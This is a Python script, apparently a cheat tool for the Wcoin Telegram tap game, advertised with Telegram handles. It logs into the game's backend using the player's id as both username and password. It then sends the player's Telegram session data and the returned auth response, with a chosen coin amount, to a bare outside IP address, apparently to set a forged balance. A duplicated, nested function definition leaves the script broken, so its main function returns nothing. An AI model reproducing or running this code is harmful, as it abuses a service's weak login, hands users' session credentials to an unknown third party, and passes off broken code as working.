import os
import pyfiglet
from colorama import Fore, Style, init
import json
import requests
import time 
from urllib.parse import urlparse, parse_qs
from user_agent import generate_user_agent

# Initialize colorama for color display
init(autoreset=True)

# Generate a user agent
user_agent = generate_user_agent('android')
headers = {
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://alohomora-bucket-fra1-prod-frontend-static.fra1.cdn.digitaloceanspaces.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://alohomora-bucket-fra1-prod-frontend-static.fra1.cdn.digitaloceanspaces.com/',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Android WebView";v="128"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'x-requested-with': 'org.telegram.plus',
}

def main_wcoin(session, amount, key):
   def main_wcoin(session, amount, key):
    # Parse the session URL to extract tgWebAppData
    parsed_url = urlparse(session)
    query_params = parse_qs(parsed_url.fragment)
    
    # Retrieve tgWebAppData from query parameters
    tgWebAppData = query_params.get('tgWebAppData', [None])[0]
    if tgWebAppData is None:
        raise ValueError("Error: 'tgWebAppData' not found in session URL fragment.")

    # Parse user data from tgWebAppData
    try:
        user_data = parse_qs(tgWebAppData).get('user', [None])[0]
        if user_data is None:
            raise ValueError("Error: 'user' data not found in tgWebAppData.")
        user_data = json.loads(user_data)
    except json.JSONDecodeError:
        raise ValueError("Error: Failed to decode JSON in user data.")

    identifier = str(user_data.get('id'))
    json_data = {
        'identifier': identifier,
        'password': identifier,
    }

    # First POST request to authentication endpoint
    try:
        res = requests.post(
            'https://starfish-app-fknmx.ondigitalocean.app/wapi/api/auth/local', 
            json=json_data
        ).json()
    except requests.RequestException as e:
        raise RuntimeError(f"Error: Request to auth endpoint failed. {e}")

    # Second POST request to the API
    try:
        r = requests.post(
            'http://77.37.63.209:5000/api',
            json={'initData': session, 'serverData': res, 'amount': amount, 'key': key}
        )
        # Check if the response contains JSON data
        if r.status_code == 200 and r.text.strip():
            return r.json()
        else:
            raise RuntimeError("Error: API response is empty or not in JSON format.")
    except requests.RequestException as e:
        raise RuntimeError(f"Error: Request to API endpoint failed. {e}")
    except json.JSONDecodeError:
        raise RuntimeError("Error: Failed to parse JSON response from the API.")


def create_gradient_banner(text):
    banner = pyfiglet.figlet_format(text).splitlines()
    colors = [Fore.GREEN + Style.BRIGHT, Fore.YELLOW + Style.BRIGHT, Fore.RED + Style.BRIGHT]
    total_lines = len(banner)
    section_size = total_lines // len(colors)
    for i, line in enumerate(banner):
        if i < section_size:
            print(colors[0] + line)  # Green
        elif i < section_size * 2:
            print(colors[1] + line)  # Yellow
        else:
            print(colors[2] + line)  # Red

def print_info_box(social_media_usernames):
    colors = [Fore.CYAN, Fore.MAGENTA, Fore.LIGHTYELLOW_EX, Fore.BLUE, Fore.LIGHTWHITE_EX]
    box_width = max(len(social) + len(username) for social, username in social_media_usernames) + 4
    print(Fore.WHITE + Style.BRIGHT + '+' + '-' * (box_width - 2) + '+')
    
    for i, (social, username) in enumerate(social_media_usernames):
        color = colors[i % len(colors)]  # Cycle through colors
        print(color + f'| {social}: {username} |')
    
    print(Fore.WHITE + Style.BRIGHT + '+' + '-' * (box_width - 2) + '+')

if __name__ == "__main__":
    banner_text = "WHYWETAP"
    os.system('cls' if os.name == 'nt' else 'clear')
    create_gradient_banner(banner_text)
    social_media_usernames = [
        ("CryptoNews", "@ethcryptopia"),
        ("Auto Farming", "@whywetap"),
        ("Auto Farming", "@autominerx"),
        ("Coder", "@demoncratos"),
    ]
    
    print_info_box(social_media_usernames)
    user_input = input("\nEnter Wcoin Session: ")
    balance_input = input("Enter Coin Amount: ")
    key = input("Enter Authorization Key: ")
    
    try:
        data = main_wcoin(user_input, int(balance_input), key)
        os.system('cls' if os.name == 'nt' else 'clear')
        create_gradient_banner('Done')

        print(Fore.GREEN + Style.BRIGHT + "=== User Information ===")
        print(Fore.YELLOW + f"Username: {data.get('username', 'N/A')}")
        print(Fore.CYAN + f"Email: {data.get('email', 'N/A')}")
        print(Fore.MAGENTA + f"Telegram Username: {data.get('telegram_username', 'N/A')}")
        print(Fore.BLUE + f"Balance: {data.get('balance', 'N/A')}")
        print(Fore.LIGHTWHITE_EX + f"Clicks: {data.get('clicks', 'N/A')}")
        print(Fore.WHITE + f"Max Energy: {data.get('max_energy', 'N/A')}")
        print(Fore.GREEN + Style.BRIGHT + f"Created At: {data.get('createdAt', 'N/A')}")
        print(Fore.GREEN + Style.BRIGHT + "========================")
    
    except KeyError as e:
        print(Fore.RED + Style.BRIGHT + f"Error: Missing expected key in response data: {e}")
    except ValueError as e:
        print(Fore.RED + Style.BRIGHT + f"Value Error: {e}")
    except RuntimeError as e:
        print(Fore.RED + Style.BRIGHT + f"Runtime Error: {e}")
    except Exception as e:
        print(Fore.RED + Style.BRIGHT + f"Unexpected Error: {e}")
